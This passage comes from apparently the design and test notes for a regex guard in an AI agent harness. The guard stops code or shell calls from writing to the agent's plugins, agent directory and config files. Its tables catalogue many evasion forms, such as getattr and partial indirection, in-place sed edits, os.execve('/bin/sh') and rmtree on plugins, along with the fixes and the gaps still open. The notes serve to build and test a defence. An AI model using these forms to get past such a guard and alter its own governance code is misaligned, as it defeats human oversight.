    elif ctx == "adv024":
        fires = adv024_fires(blob)
    elif ctx == "fallback":
        fires = fallback_fires(blob)
    else:
        fires = False
    if fires != want:
        F.append(f"{label}: fired={fires} want={want}")

print(f"{len(cases)-len(F)}/{len(cases)} OK")
for x in F:
    print(f"  FAIL {x}")
```

## Key FP mechanisms (why each guard matters)

| FP blob | Mechanism | Fixed by |
|---|---|---|
| `exec(open(f).read()); chr(99)` | semicolon separates; no write primitive | ENCODE+RENAME both need to match |
| `exec(open(f).read()), chr(99)` | `)` of `.read()` terminates 2-level alt before `,chr` | 2-level `(?:[^()\n]|\((?:[^()]|\([^()]*\))*\))` stops on outer `)` |
| `open(p,'r')` | `r` in first mode char position | `[awx]` only (no `r`); separate `r[bt]*+` branch |
| `Path(p).open(mode='r')` | `mode=[awxr]` matched `r` (read-only) | Changed to `mode=[awx]` + separate `r[bt]*\+` branch (ADV-W9-006) |
| `chr(9); if x > .5` | `.` in redirect target class matches decimal point | Remove `.` from `[/'"~.]`; use `[/'"~]` |
| `chr(9); echo "please install this"` | `install` preceded by space | Shell-operator anchor `[;|&\n]\s*` not `[\s;|&]` |
| `chr(9); n > 1` | `>` followed by digit/word char | No `\w` in redirect target class |

## Key FP mechanisms added (Waves 7–13)

| FP blob | Mechanism | Fixed by |
|---|---|---|
| `exec(open(f).read()), chr(99)` | comma is tuple op; `)` of `.read()` terminates alt before comma | 2-level nested-paren stop |
| `Path(p).open(\n'w')` | no `\s*` after `(` in literal-mode branch | Unified `\.open\s*\(\s*(?:...)` (ADV-W8-003) |
| `Path(p).open(mode='r')` | `mode=[awxr]` matched read-only `r` | Changed to `mode=[awx]` (ADV-W9-006) |
| `open(os.path.split(os.path.join(a,b))[0],'w')` | 1-level `\([^()]*\)` can't span `split(join(...))` | 2-level `\((?:[^()]|\([^()]*\))*\)` (ADV-W9-001) |
| `open(\np,'w')` with single leading `\n` | `[^()\n]` stops at newline before path name | `[ \t\n]?` prefix absorbs one newline (ADV-W9-002) |
| `print(json.dumps(x))` with encode | `json.dump` prefix matches `json.dumps` | `json.dump\b` word boundary (ADV-W10-009) |
| `p.write_text('x')` on variable | only static `Path(...).write_text` and `getattr` were covered | `\.(write_text\|write_bytes)\s*\(` branch added (ADV-W10-001a) |
| `cp /tmp/x plugins/evil.py` via terminal | `looks_like_rename_or_copy` only checked `_RENAME_PRIMITIVES` (Python), not shell verbs | `_SHELL_RENAME` added to `looks_like_rename_or_copy()` (ADV-W11-001) |
| `os.path.join('plugins','evil.py')` | `'plugins/'` token absent; bare `'plugins'` not in HR tokens | `_QUOTED_REL_HR` detects quoted bare `plugins`/`agent` as join args (ADV-W11-003) |
| `open('config.yml','w')` | `config.yml` not in `_HR_TOKENS` (only `config.yaml`) | Added `'config.yml'` to all HR token lists (ADV-W11-005) |
| `cp /tmp/x /tmp/subagent/x.py` DENY | bare `'agent/'` substring matched `subagent/` | Reverted to absolute-only `/agent/` in `_HR_TOKENS`; word-boundary `_HR_REL` for relative (W13-001) |
| `pip install pyyaml # config.yaml` DENY | unbounded prefix-word loop let `pip` + `install` fire | Removed `install` from verb list; ONE prefix word only (ADV-W13-005) |
| `os.system('echo x > plugins/evil.py')` not caught | redirect branch was `elif` after rename — `os.system` fires rename, skips redirect | Separate `if not high and tool_name == 'terminal'` block (ADV-W13-002) |
| `n > 0 to plugins/x.py` DENY | `>>?\s*\S` matched bare `>` with no preceding anchor | Tightened to `(?:^|[\s;|&])>>?\s+\S` (ADV-W13-003) |
| `print('agent') + Path('x').write_text` DENY | `Path\s*\(` counted as `_join_context`, activated `_QUOTED_REL_HR` | Removed `Path\s*\(` from `_join_context`; only `os.path.join\|joinpath` (ADV-W13-004) |
| `>file` / `1>file` / `2>>file` not caught | W13 required `\s+` after `>` — broke nospace and fd-prefixed redirects | Reverted to `(?:\d+)?>>?\s*\S`; use terminal-only gate for FP prevention (ADV-W14-001) |
| `sudo -n cp /tmp/x /plugins/foo.py` not caught | two prefix words exhaust single-word `(?:\w+\s+)?` | `_COPY_VERB` blob scan catches it; no prefix anchoring needed (ADV-W14-002) |
| `evil.py.tmp` write not caught | `_HIGH_PLUGIN_PY` ended at `\.py$`, missing `.tmp` suffix | Added `(?:\.tmp)?$` to both patterns (ADV-W14-008) |
| `from os import system; system('cmd')` not caught | `os\.system\s*\(` requires `os.` prefix | Added bare `(?<!\.)(system|execv|execl...)\s*\(` to `_RENAME_PRIMITIVES` (ADV-W14-005) |
| `getattr(` + 101 spaces + `p, 'write_text')` not caught | `[\s\S]{0,100}?` cap exhausted at 100; match fails at 101st char before comma | Cap raised to `{0,500}?`; lazy `?` keeps ReDoS near 0ms (ADV-W15-002) |
| `if n > 0; echo plugins/foo.py` fires redirect | `(?:\d+)?>>?\s*\S` matched bare `>` with digit/word target | Tightened target: `(?:[./~]|[a-zA-Z_]\w*[./])` requires path-like chars (ADV-W15-004) |
| `_HIGH_HERMES_PLUGIN_PY` misses `.py.tmp` | `_HIGH_HERMES_PLUGIN_PY` did not include `(?:\.tmp)?$` while the other two did | Added `(?:\.tmp)?$` to all three HIGH patterns (ADV-W15-006) |
| `subagent/x.py` fires via copy-verb fallback | inline regex in fallback block was `r"(?<!\\w)..."` (two backslashes = literal `\w` lookbehind) | Fixed to `r"(?<!\w)..."` (one backslash = word-char lookbehind); verify byte-by-byte (ADV-W15-001b) |
| `>'plugins/foo.py'` and `>"plugins/evil.py"` ALLOW | `_SHELL_REDIRECT` only accepted `[./~]` and `[a-zA-Z_]\w*[./]` targets; quoted targets start with quote char | Extended target class with `['"`$]` and `[|]?` for clobber redirect (ADV-W16-001) |
| `p.rename('plugins/evil.py')` ALLOW | `.rename()` as instance method only matched `os.rename` (prefix form) | Added `\.(?:rename|replace)\s*\(` to `_RENAME_PRIMITIVES` (ADV-W16-002) |
| `os.execve('/bin/sh', [], {})` ALLOW | `os.exec[vle]\w*` not in `_RENAME_PRIMITIVES`; bare `execve` not in bare list | Added `os\.exec[vle]\w*\s*\(` pattern and `execve` to bare list (ADV-W16-003) |
| `getattr(` + 501 spaces + `p, 'write_text')` ALLOW | `{0,500}` cap exhausted at 501st char | Cap raised to `{0,2000}` (ADV-W16-004) |
| `io.FileIO('plugins/evil.py','w').write(b'x')` ALLOW | `open()` pattern matches bulitin; `io.FileIO` is a separate write primitive | Added `io\.(?:FileIO|open)\s*\(` to `_RENAME_PRIMITIVES` (ADV-W16-007) |
| `scp /tmp/x plugins/evil.py` ALLOW | `_COPY_VERB` did not include `scp`; only local copy verbs were listed | Added `scp` to `_COPY_VERB` (ADV-W16-008) |
| `sed -i 's/a/b/' plugins/foo.py` ALLOW | in-place edit has no copy verb; `sed` not in `_SHELL_RENAME` or `_COPY_VERB` | Added `_INPLACE_EDITOR` pattern + `-i`/`-r` flag gate (ADV-W16-008) |
| `operator.attrgetter('write_text')(p)('x')` ALLOW | `getattr(` pattern literal misses `operator.attrgetter` indirect form | Added `operator\.(?:attrgetter|methodcaller)\s*\(` to `_RENAME_PRIMITIVES` (ADV-W16-009) |
| `data = content.replace('a','b')` DENY | `\.replace\s*\(` in instance-method branch matched str.replace | Removed `.replace` from instance branch; added `.touch` instead (ADV-W17-001+007) |
| `sed -i 's/a/b/' plugins/foo.py` ALLOW | `_INPLACE_EDITOR` gate was nested INSIDE `_COPY_VERB` block; sed is not a copy verb so the inner if was unreachable | Moved `_INPLACE_EDITOR` gate to a separate top-level if block (ADV-W17-002) |
| `io.FileIO('plugins/foo.py')` DENY | `io\.(?:FileIO|open)\s*\(` fired on any FileIO call regardless of mode; default mode is read-only | Added write-mode arg requirement: `[waxWAX]` for FileIO, `[awx]` for io.open (ADV-W17-004) |
| `getattr(` + 2001 chars + `, 'write_text')` ALLOW | Finite `{0,2000}` cap exhausted by padding | Replaced cap with typed first-arg pattern: simple var, Path literal, or single call (ADV-W17-005); all practical first-arg forms are caught without a finite cap |
| `Path('plugins','evil.py').write_text('x')` ALLOW | `_join_context` Path pattern required slash after token: `[^)]*['"](plugins\|agent)['"]/ `; multi-arg form has bare `'plugins'` with comma, no slash | Added `['"](?:plugins\|agent)['"]\s*,` clause to `_join_context` (ADV-W17-006) |
| `p.touch()` on a Path variable ALLOW | `.touch()` not in instance method branch (`\.(?:rename\|replace)\s*\(`) | Added `.touch` to instance method alternation (ADV-W17-007) |
| `p.replace('plugins/evil.py')` ALLOW (Wave 18 regression) | W17 removed `.replace` from instance branch to fix str.replace FP; Path.replace() IS a write primitive | Restored `.replace` to instance method alternation; str.replace FP guard is separate (ADV-W18-001) |
| `getattr(ps[0],'write_text')` ALLOW | subscript first-arg `ps[0]` not matched by simple-var or Path() alts | Added `[a-zA-Z_][\w.]*\[[^\]]{0,80}\]` alt to getattr first-arg pattern (ADV-W18-002) |
| `getattr((p),'write_text')` ALLOW | parenthesized first-arg `(p)` not matched by simple-var alt | Added `\([a-zA-Z_][\w.]*\)` alt to getattr first-arg pattern (ADV-W18-002) |
| `getattr(p,'touch')()` ALLOW | `touch` not in getattr method-name alternation | Added `touch` alongside `write_text|write_bytes|open|replace|rename|system|popen|symlink|unlink` (ADV-W18-003) |
| `io.FileIO('plugins/evil.py','r+')` ALLOW | mode gate `[waxWAX]` did not include `+` (update/read-write mode) | Widened to `[^'"]*[wax+]` — matches any mode string containing w/a/x/+ (ADV-W18-004) |
| `io.open('plugins/evil.py','rb+')` ALLOW | same as above for io.open | Same fix: `[^'"]*[wax+]` (ADV-W18-004) |
| `gawk -i inplace 'NR==1' plugins/x.py` ALLOW | `gawk` not in `_INPLACE_EDITOR` tool list; flag `-i inplace` (separate word) not matched by `-i\b` alone | Added `gawk` to tool list; widened flag pattern to `(?:-(?:in-place|pi)|--in-place|-i\b)` (ADV-W18-005) |
| `perl -pi -e 's/x/y/' plugins/foo.py` ALLOW | clustered flag `-pi` not matched by `-i\b` | Same fix: `(?:-(?:in-place|pi)|--in-place|-i\b)` matches `-pi` (ADV-W18-005) |
| `tar.extractall('plugins/')` ALLOW | archive extraction into plugins/ not in `_RENAME_PRIMITIVES` | Added `extractall\|unpack_archive` to `_RENAME_PRIMITIVES` (ADV-W18-006) |
| `patch < evil.patch # plugins/foo.py` ALLOW | `patch` not in `_COPY_VERB`; patch modifies target in-place by default | Added `patch|ed|ex` to `_COPY_VERB` (ADV-W18-007/009) |
| `fileinput.input('plugins/x.py', inplace=True)` ALLOW | Python fileinput loop with `inplace=True` replaces files but avoids `open()` form | Added `fileinput\.input\s*\([^)]+inplace\s*=\s*True` regex to `_RENAME_PRIMITIVES` (ADV-W18-008) |
| `partial(open, 'plugins/evil.py', 'w')` ALLOW | `functools.partial` binding `open` defers file handle creation; no direct `open(` in blob | Added `partial\s*\(\s*(?:open\|exec)` to `_RENAME_PRIMITIVES` (ADV-W18-010) |
| `getattr(p.resolve(),'write_text')('x')` ALLOW | `p.resolve()` as first arg: simple-var alt matched `p.resolve` (dotted name) but not the trailing `()` | Added optional call suffix `(?:\([^)]{0,80}\))?` to simple-var alt (a) in getattr first-arg (ADV-W19-001) |
| `getattr(p , 'write_text')('x')` ALLOW | space before comma exhausted the simple-var alt `[a-zA-Z_][\w.]*` without absorbing the trailing space | `\s*` already present before `(?:` in first-arg group absorbs the space between `)` and `,` (ADV-W18-001 — confirmed effective in W19) |
| `getattr(zf,'extractall')('plugins/')` ALLOW | `extractall` not in getattr method-name list | Added `extractall\|unpack_archive` to name list (ADV-W19-002) |
| `fileinput.FileInput('plugins/foo.py', inplace=True)` ALLOW | pattern only covered `fileinput.input`; `FileInput` class constructor form not matched | Extended to `fileinput\.(?:input\|FileInput)` (ADV-W19-003) |
| `partial(io.open, 'plugins/evil.py', 'w')` ALLOW | partial pattern covered only `(?:open\|exec)` as first arg; `io.open`/`io.FileIO`/`builtins.open` bypassed | Extended to `(?:open\|io\.open\|io\.FileIO\|builtins\.open\|exec)` (ADV-W19-004) |
| `sed -Ei 's/a/b/' plugins/foo.py` ALLOW | `(?:-(?:in-place\|pi)\|--in-place\|-i\b)` flag gate did not match `-Ei` (letter before `i` not in alternation) | Replaced with `(?:-[a-zA-Z]*i[a-zA-Z]*\b\|--in-place)` — matches any cluster containing `i` (ADV-W19-005) |
| `os.replace('/tmp/evil.py','plugins/foo.py')` ALLOW | `os.replace` was removed from `os.(rename\|replace)` in W17 (confusion with instance `.replace`); not restored | Added `os.replace` to `os.(open\|popen\|system\|replace)` alternation (ADV-W19-007) |

| `fileinput.input(Path('plugins/x.py'), inplace=True)` ALLOW | `[^)]+` in fileinput pattern stops at first `)` inside `Path(...)`, terminating the match before reaching `inplace=` | Replaced `[^)]+` with `(?:[^()]|\([^)]*\))*` — allows one level of inner parens (ADV-W22-002) |
| `fileinput.input('plugins/x.py', inplace='True')` ALLOW | Pattern matched only `True|[1-9]\d*|(True)|not X` literal forms; string literal `'True'`, float `0.5`, and call `bool(1)` bypassed | Rewrote to negative-lookahead strategy: block unless inplace= is explicitly `False|0|None|''` (ADV-W22-001) |
| fileinput truthy-detection pattern a no-op (entire fileinput gate never fired) | `""` inside r-string `r"..."` terminates the r-string at the first `"`, causing Python implicit concatenation to produce a malformed lookahead `(?!(...|''|))` with empty alt that always fails | Rewrote pattern using only single-quote `''` form; never use `""` inside `r"..."` patterns (ADV-W22-001) |
| `fileinput.input('plugins/x.py', inplace=False or True)` ALLOW (should BLOCK) | Negative lookahead `(?!False...)\s*[,)#]` checks falsy+terminator but `False or True` has `or` between `False` and `)` — no immediate terminator, so lookahead PASSES and pattern BLOCKS. Wait — this was a FALSE finding: lookahead sees `False` but next char is ` ` then `or`, not `[,)#]`, so the inner group FAILS → negative lookahead PASSES → pattern continues → BLOCK ✓. The Wave 22 pattern correctly blocks boolean-expr forms; the Wave 23 KW/POS split adds two-level paren walker and `dict()`/`vars()`/`locals()`/`globals()` unpack forms, not a fundamental logic change | Split into KW form + POS form with two-level paren walkers; added `**dict(...)`/`**vars()`/`**locals()`/`**globals()` unpack detection alongside `**{...}` (ADV-W23-001/002) |
| `fileinput.input(files, inplace=True)` with `files` being a 2-level nested-paren expr | `(?:[^()]|\([^)]*\))*` (one-level paren walker) stops at the inner `)` of a two-level arg like `os.path.join(os.path.dirname(x),'f.py')` | Upgraded to two-level walker `(?:[^()]|\((?:[^()]|\([^)]*\))*\))*` in both KW and POS forms (ADV-W23-003) |
| `find agent -name '*.py' -exec sed -i '...' {} +` ALLOW | `_HR_REL` with `(?:/|\b)` for `agent` matched bare `agent` too broadly — `agent_name`, `agent =`, comments with `agent` all triggered | Reverted `agent` to require trailing `/`; `plugins` keeps bare `\b` form: `_HR_REL = re.compile(r'(?<!\w)(?:plugins(?:/|\b)|agent/)')` (ADV-W23-HR-REL) |
| `partial(Path.symlink_to, p)` ALLOW | partial line 1 only covered `write_text|write_bytes|open|replace|rename|touch`; `symlink_to|hardlink_to|unlink` not listed | Added `symlink_to|hardlink_to|unlink` to Path write-method list (ADV-W22-003) |
| `partial(os.execvpe, 'sh', [], {})` ALLOW | partial line 2 used explicit `os.exec[vle]\w*`; did not cover `os.execvpe`/`os.execlp`/`os.execvp` variants | Replaced with `os.exec\w+` wildcard — covers all exec variants (ADV-W22-003) |
| `partial(os.symlink, '/tmp/x')` ALLOW | `os.symlink|os.link|os.remove|os.unlink` not in partial pattern | Added to partial line 2 (ADV-W22-003) |
| `partial(subprocess.check_call, [...])` ALLOW | `check_call` not in subprocess group in partial pattern | Added to subprocess group (ADV-W22-003) |
| `partial(shutil.rmtree, 'plugins/')` ALLOW | `rmtree` not in shutil group in partial pattern | Added to shutil group (ADV-W22-003) |
| `getattr(p, F'write_text')` ALLOW | prefix alternation `(?:[frb]|rb|br)?` did not cover uppercase `F/R/B` or unicode prefix `u` | Widened to `(?:[bBfFrRuU]{0,2})?` (ADV-W22-005) |
| `getattr(p, '''write_text''')` ALLOW | quote pattern `['"]` matched only single char; triple-quoted form `'''name'''` requires `{1,3}` repetition | Widened to `['"]{1,3}` (ADV-W22-005) |
| `getattr(ps[` + 81 `x`s + `], 'write_text')` ALLOW | subscript alt `[a-zA-Z_][\w.]*\[[^\]]{0,80}\]` had `{0,80}` cap; 81-char subscript content exceeded it | Replaced cap with unbounded `[^\]]*` — cap was never needed for ReDoS safety (ADV-W22-006) |
| `find plugins -name '*.py' -exec sed -i...` ALLOW | `_HR_REL` required trailing `/` after `plugins|agent`; bare directory name without `/` not matched | Extended to `(?:/|\b)` — matches trailing `/` OR any word boundary (ADV-W22-007) |
| `getattr(shutil, 'rmtree')('plugins/')` ALLOW | `rmtree` not in getattr method-name list | Added `rmtree|execv|execl|execle|execlp|execvp|execvpe|copy|copy2|move|symlink_to|hardlink_to` to name list (ADV-W22-008) |
| `io.FileIO(os.path.join('plugins','evil.py'), 'w')` ALLOW | `[^)]{0,150}` path-arg stop on inner `)` of `os.path.join(...)` | Replaced with `(?:[^()\n]|\([^)]*\)){0,200}` one-level nested paren walker (ADV-W25-001) |
| `io.FileIO('plugins/evil.py', chr(119))` ALLOW | mode pattern `[^'"]*[wax+]` requires literal write-mode char; `chr(119)` has no `w` | Added `chr\s*\(` branch for both positional and keyword mode args (ADV-W25-002) |
| `from io import FileIO; FileIO('plugins/evil.py', 'w')` ALLOW | `io\.FileIO\s*\(` requires `io.` prefix; bare `FileIO` misses | Added `FileIO` to bare-name negative-lookbehind list `(?<![\w.])(...|FileIO)\s*\(` (ADV-W25-003) |
| `from os import truncate; truncate('plugins/evil.py', 0)` ALLOW | `os\.truncate\s*\(` requires `os.` prefix; bare `truncate` misses | Added `truncate|remove|unlink` to bare-name list (ADV-W25-003) |
| `io.FileIO('plugins/evil.py', **{'mode': 'w'})` ALLOW | positional and `mode=` keyword patterns both miss dict-unpack `**{...}` form | Added `\*\*\s*(?:\{[^}]*mode[^}]*[wax+]|dict\s*\()` dict-unpack branch (ADV-W25-004) |
| `getattr((ps[0])[1], 'write_text')` ALLOW | outer `()` around subscript chain hides it from subscript alt `[a-zA-Z_][\w.]*(?:\[[^\]]*\])+` | Added parenthesized-subscript alt `\([a-zA-Z_][\w.]*(?:\[[^\]]*\])+\)` (ADV-W25-005) |
| `getattr(obj.method()[0], 'write_text')` ALLOW | method-call suffix `(?:\([^)]*\))?` in chained-call alt (a) consumes `()` but not trailing `[0]` subscript | Added call-then-subscript alt `[a-zA-Z_][\w.]*(?:\.[a-zA-Z_]\w*)?\s*\([^)]*\)(?:\[[^\]]*\])+` (ADV-W25-006) |
| `getattr(object=p, name='write_text')` ALLOW | all first-arg patterns match positional first arg; `object=` keyword bypasses the positional structure | Added keyword-form pattern `getattr\s*\(\s*(?:object\s*=|name\s*=[bBfFrRuU]{0,2}['"])` (ADV-W25-007) |
| `getattr(*[p, 'write_text'])` ALLOW | star-unpack `*[...]` is not a positional expression and not matched by any first-arg alt | Added star-unpack pattern `getattr\s*\(\s*\*\s*\[` (ADV-W25-008) |

The ADV-024 encode block must NOT call `has_approved_proposal()` — proposals cannot
approve obfuscated writes. If ENCODE fires AND a write primitive AND an HR token are all
present in the same `execute_code` blob, DENY unconditionally with no bypass path.

The previous `extract_candidate_paths + has_approved_proposal(path)` approach also fails:
`extract_candidate_paths` may yield bare tokens (`'config.yaml'`) that `_norm_path`
resolves to CWD paths, then matching against a deployed `target='config.yaml'` (relative)
approves all blobs mentioning the substring (same root cause as ADV-W9-004).

## ADV-W10-003 / ADV-W11-001..004: relative plugin/agent paths

Relative paths like `'plugins/foo/__init__.py'` pass `is_high_risk_target()` (abspath
resolves under CWD) but are NOT extracted by `extract_candidate_paths()`. Two fixes:

1. Extend `_HR_TOKENS` and `_HR_TOKENS_ENC` to include `'plugins/'` and `'agent/'`
   (with trailing slash). These appear in most literal relative path forms and in
   `os.system()` shell-string contents.

2. Add `_QUOTED_REL_HR = re.compile(r"['\"](plugins|agent)['\"]\s*[,)]")` for the
   `os.path.join('plugins', 'evil.py')` case where the token appears without trailing `/`.
   Fire when BOTH `_QUOTED_REL_HR` AND `_RENAME_PRIMITIVES` match — DENY without bypass.

3. Add `_SHELL_RENAME` to `looks_like_rename_or_copy()` so terminal `mv`/`cp` commands
   to relative plugin paths trigger the fallback blob scan.

Do NOT use a quote-anchored `_REL_HR` regex alone (`['\"]plugins/[^'\"]+\.py['\"]`)
— it misses `os.system()` shell strings, split/concat patterns, and unquoted paths.
The token scan + verb gate approach is simpler and broader.

## ADV-W10-004: unconditional bootstrap exception on synthetic placeholder

The `<rename-primitive + high-risk token>` synthetic placeholder exists to catch
temp+rename patterns where no concrete path is extractable. It must go through the same
`has_approved_proposal(hint, proposals)` gate as concrete paths. Do NOT add:

```python
# WRONG: this bypasses ADV-024 for any terminal command mentioning the plugin name
if "governance-hard-block" in blob:
    covered = True
```

The `is_bootstrap_exception(path)` function requires a concrete path inside the plugin's
own directory. There is no legitimate bootstrap exception for the synthetic placeholder.

## Secondary fail-closed check (ADV-W8-002 mitigation)

For `execute_code` only: if ENCODE fires AND `open(` appears in the stripped blob AND a
high-risk token (`config.yaml`, `/plugins/`, `/agent/`, `plugin.yaml`) is present, DENY
unconditionally even when mode-parsing can't confirm a write. This covers the documented
miss where two or more `\n` between `open(` and the path arg defeat `[^()\n]`.

```python
_HR_TOKENS_ENC = ("config.yaml", "/plugins/", "/agent/", "plugin.yaml")
if (tool_name == "execute_code"
        and "open(" in blob.replace(" ","").replace("\n","")
        and any(tok in blob for tok in _HR_TOKENS_ENC)):
    return DENY
```

Known FP: `chr(9); x = open('config.yaml').read()` (read-only open + HR token) triggers this.
Fail-closed is intentional — encode + open + HR_TOKEN is always suspicious in execute_code.

## ADV-W9-004: HR_TOKEN approval bypass via relative proposal target (superseded by ADV-W10-002)

For the non-encode ADV-024 path, encourage absolute paths in proposals:
`target = os.path.realpath(os.path.abspath(target_str))`.

## ADV-W14-007: string concatenation miss

`'plugins' + '/'` (string concatenation evaluated at runtime) is not caught by `_HR_REL`
(which requires the `/` to follow `plugins` in the static blob) or `_HR_TOKENS` (which
uses `in blob` substring matching — `'plugins' + '/'` is present but as two separate tokens
not joined). This miss is documented and accepted: string concatenation that resolves to
a plugin path requires runtime evaluation, which the pattern-matching gate cannot perform.
The HR_TOKEN gate (`'/plugins/'` absolute form) still catches the evaluated result if the
path appears elsewhere in the blob.

## Coverage gaps (documented tradeoffs)

| Pattern | Miss | Why acceptable |
|---|---|---|
| `getattr(` with list/dict/complex-expr first arg | Typed first-arg pattern requires identifier, Path(), or single call; `getattr([1,2,3],'write_text')` misses | Practical exploitation requires a file object as first arg, which must be a variable or Path — not a literal |
| `getattr(p.resolve().joinpath('evil.py'), 'write_text')` | Optional call suffix `(?:\([^)]{0,80}\))?` matches ONE call level; two consecutive calls exhaust it | Deeply nested method chains are uncommon; single-method form `p.resolve()` and `p.joinpath()` ARE caught (W19-001) |
| `import os as o; o.execve(...)` | Aliased module calls require import-alias tracking; not implemented | Documented miss; explicit `os.execve()` form IS caught |
| `operator.itemgetter('write_text')` | `itemgetter` fetches a dict/sequence item by key, not an attribute; semantically different from `attrgetter` | Accepted: `itemgetter` result is not callable as a method handle in the way `attrgetter` is |
| `from operator import attrgetter; attrgetter('write_text')(p)` | Aliased operator import; same class as `import os as o` miss | Accepted: requires symbol-table tracking (ADV-W17-003) |
| `io.FileIO(path, mode=None)` or keyword-only `mode=` arg | Mode gate uses positional second arg pattern; keyword `mode=` without value fails | Exotic; `mode=None` is read-only by definition; keyword form with write value IS caught via separate `mode=` branch |
| `io.FileIO(path, os.O_WRONLY)` numeric flags | Numeric flag `2` (O_WRONLY) not matched by string mode gate `[^'"]*[wax+]` | Accepted miss: numeric flags are exotic; `os.open()` with O_WRONLY IS caught separately |
| `functools.partial(print, ...)` without open/exec | `partial\s*\(\s*(?:open\|exec)` is name-specific; other partial uses ALLOW | Correct FP behavior: only open/exec as first arg to partial is dangerous |
| `sed -n 's/a/b/p' plugins/foo.py` (no `-i`) ALLOW | dry-run sed; `-i` flag required for in-place edit | Correctly ALLOWed by `_INPLACE_EDITOR` gate (flag check prevents FP) |
| `>/tmp` (bare dir, no filename) | path-like target `[a-zA-Z_]\w*[./]` requires `.` or `/` in target word; `/tmp` starts with `/` so IS caught | Actually caught; true gap: bare `>tmp` (no leading `/`) would miss |
| `import os as o; o.system('cmd > plugins/evil.py')` | `o.system(` not matched; lookbehind `(?<!\.)` only skips preceding `.` | Aliased module calls cannot be detected without import tracking; documented miss |
| `pip install pyyaml # config.yaml` terminal DENY | `install` in `_COPY_VERB` fires when `config.yaml` HR token appears in comment | Accepted residual FP: fail-closed is correct; pipeline proposal required |
| `getattr(` + 101 spaces + `p, 'write_text')` was a bypass (now fixed) | Former `{0,100}` cap | Fixed by ADV-W15-002 (cap raised to 500) |

| `open(\n\np, 'w')` two+ leading newlines | `[ \t\n]?` absorbs only one | Secondary encode+open+HR_TOKEN check covers high-risk targets |
| `open(p, 'w')` with 151+ char identifier | `{0,150}` token cap exhausted | Cap is generous; real-world paths are shorter |
| `getattr(getattr(obj,'__class__'),'write_text')` | `[^,)]{0,80}` stops at inner `)` | Deeply nested getattr is exotic; caught if encode present via HR_TOKEN gate |
| `sudo nice cp /tmp/x /plugins/foo.py` | two prefix words exhaust the single-word `(?:\w+\s+)?` | Three-token prefix chains are exotic; `/bin/cp` and `sudo cp` both covered |
| `sudo install -m644 /tmp/x /plugins/foo.py` | `install` removed from verb list | Absolute `/plugins/` destination caught by `extract_candidate_paths` + `is_high_risk_target` before the fallback |
| `os.system('echo x > plugins/evil.py')` in execute_code | redirect gate is terminal-only; os.system fires RENAME instead | `os.system` IS in `_RENAME_PRIMITIVES` so this is caught via RENAME+HR path, not redirect |
| `io.FileIO(os.path.split(os.path.join(a,b))[0], 'w')` two-level nested path | one-level paren walker stops at inner `)` of `split(join(...))` | Accepted: one level covers practical cases; HR_TOKEN gate backstops high-risk paths |
| `getattr(*some_var)` star-unpack from variable | `\*\s*\[` requires a literal list start `[`; variable unpacks can't be matched statically | Requires runtime analysis; accepted miss |
| `io.FileIO('plugins/evil.py', os.O_WRONLY)` numeric flag | numeric `os.O_WRONLY` has no `w`/`a`/`x`/`+` literal char; chr() pattern also misses it | Exotic; `os.open()` with `O_WRONLY` IS caught via `os\.(open|...)` pattern |
| `io.FileIO(**{'mode': 'w', 'closefd': True})` — mode key not first in dict | `[^}]*mode[^}]*[wax+]` scans the entire dict body; mode key order doesn't matter | Actually caught by `[^}]*mode` — any position within `{}` |
| `pip install pyyaml # config.yaml` via terminal | `install` in `_COPY_VERB` + `config.yaml` HR token causes DENY | Accepted residual FP: fail-closed is correct when pip terminal commands reference config files |
| `(open)('plugins/evil.py', 'w')` ALLOW | `\bopen\b` word-boundary pattern does not match `(open)` — parenthesis around the builtin name defeats word-boundary anchoring | Added `\(open\)\s*\(` grouped-open pattern (ADV-W26-001) |
| `[open][-1]('plugins/evil.py', 'w')` ALLOW | `[open]` subscript with negative index: initial `\[\w*\]` pattern only allowed alphanumeric indices | Extended to `\[[^\]]*\]` to allow any content except `]`, covering `-1`, spaces, and complex expressions (ADV-W27-002) |
| `(open,)[0]('plugins/evil.py', 'w')` ALLOW | one-element tuple `(open,)` followed by subscript-call; neither grouped-open nor list-subscript pattern covered this form | Added tuple-subscript form `\(open,?\)\s*\[[^\]]*\]\s*\(` (ADV-W27-002) |
| `builtins.open('plugins/evil.py', 'w')` ALLOW | `\bopen\b` requires plain `open`; `builtins.` prefix not matched | Added `builtins\.open\s*\(` to patterns (ADV-W27-001) |
| `__builtins__['open']('plugins/evil.py', 'w')` ALLOW | `__builtins__` dict/namespace lookup retrieves open by string key; not matched by `\bopen\b` | Added `__builtins__\s*(?:\[|\b(?:get)\b|\.).*\bopen\b` (ADV-W27-001) |
| `open.__call__('plugins/evil.py', 'w')` ALLOW | calling `open.__call__` directly invokes open but avoids the `open(` literal | Added `open\.__call__\s*\(` pattern (ADV-W27-003) |
| `operator.call(open, ...)` ALLOW (Python 3.11+) | `operator.call(fn, ...)` is equivalent to `fn(...)`; not matched by `operator\.attrgetter` or direct open forms | Added `operator\.call\s*\(\s*(?:builtins\.)?open\b` (ADV-W27-003) |
| `shutil.rmtree('plugins/')` ALLOW | shutil group was `move\|copy\|copy2\|copyfile\|copytree`; `rmtree` not included | Added `rmtree` to shutil group alternation (ADV-W26-002) |
| `getattr((obj.method()[0]), 'write_text')` ALLOW | outer-paren alt `\([a-zA-Z_][\w.]*\)` requires plain var inside; `obj.method()[0]` contains `()` and `[]` inside the outer parens | Added paren-expr walker `\((?:[^()]|\([^)]*\))*\)` — allows one level of inner nested parens (ADV-W26-003) |
| `getattr((obj.method()[0]), name='write_text')` ALLOW | paren-expr first-arg combined with keyword `name=`; keyword-form pattern matched `object=...name=` but not paren-wrapped first arg + bare `name=` | Added `getattr\s*\(\s*\((?:[^()]|\([^)]*\))*\)\s*,\s*name\s*=` (ADV-W27-010) |
| `os.posix_spawnp('/bin/sh', [], {})` ALLOW | `os\.(?:spawn[levpa]*|posix_spawn)` pattern missed the `p` suffix in `posix_spawnp` | Extended to `posix_spawn[p]?` (ADV-W27-005) |
| `zipfile.ZipFile('plugins/evil.py', mode='x')` ALLOW | positional-mode zipfile pattern required mode char at `[wxa]` in a positional string arg; keyword `mode=` form not covered | Added keyword-mode branch `mode\s*=\s*[\x27\x22][wxa]` to zipfile pattern (ADV-W27-006) |
| `gzip.open('plugins/evil.py', 'wb')` ALLOW | gzip pattern `[\x27\x22][wa][\x27\x22]` required exactly one mode char; binary suffix `b` not allowed | Extended to `[wa]b?` (ADV-W27-007) |
